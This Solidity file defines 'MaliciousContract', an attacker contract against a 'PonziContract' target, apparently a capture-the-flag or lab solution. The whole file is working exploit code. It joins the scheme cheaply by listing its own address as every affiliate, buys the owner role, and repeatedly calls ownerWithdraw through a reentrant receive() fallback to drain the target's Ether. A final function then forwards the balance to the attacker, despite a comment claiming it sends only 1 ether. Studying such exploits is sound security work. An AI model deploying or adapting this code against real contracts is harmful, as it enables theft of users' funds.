// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './PonziContract.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

// Interface to interact with the Ponzi contract
interface IPonzi {
    function affiliatesCount() external view returns (uint256);

    function setDeadline(uint256 _regDeadline) external;

    function joinPonzi(address[] calldata _afilliates) external payable;

    function buyOwnerRole(address newAdmin) external payable;

    function ownerWithdraw(address to, uint256 amount) external;

    function addNewAffilliate(address newAfilliate) external;
}

contract MaliciousContract is Ownable {
    IPonzi public ponzi;

    constructor(address _target) {
        ponzi = IPonzi(_target);
    }

    // Fallback function to initiate reentrancy attack
    receive() external payable {
        if (
            msg.sender == address(ponzi) && address(ponzi).balance >= msg.value
        ) {
            ponzi.ownerWithdraw(address(this), msg.value);
        }
    }

    // Function to create a list of addresses with the contract's address
    function createListOfContractAddresses()
        internal
        view
        returns (address[] memory)
    {
        uint256 affilliatesCount_ = ponzi.affiliatesCount();
        address[] memory _victims = new address[](affilliatesCount_);
        for (uint256 i = 0; i < affilliatesCount_; i++) {
            _victims[i] = address(this);
        }
        return _victims;
    }

    // Join ponzi just with gas fees if we count with enough funds
    function freeJoin() public payable {
        address[] memory _victims = createListOfContractAddresses();
        ponzi.joinPonzi{value: _victims.length * 1 ether}(_victims);
    }

    // Function to trigger the attack
    function startReentrancyAttack() external payable {
        // Initiate the attack by sending Ether to the target contract
        freeJoin();

        // Buy the owner role in the Ponzi contract
        ponzi.buyOwnerRole{value: 10 ether}(address(this));

        // Trigger ownerWithdraw, attempting reentrancy
        ponzi.ownerWithdraw(address(this), msg.value);
    }

    // Function to send funds to the owner of the Ponzi contract
    function sendFundsToOwner() external onlyOwner {
        // Send 1 ether to the owner
        payable(msg.sender).transfer(address(this).balance);
    }
}
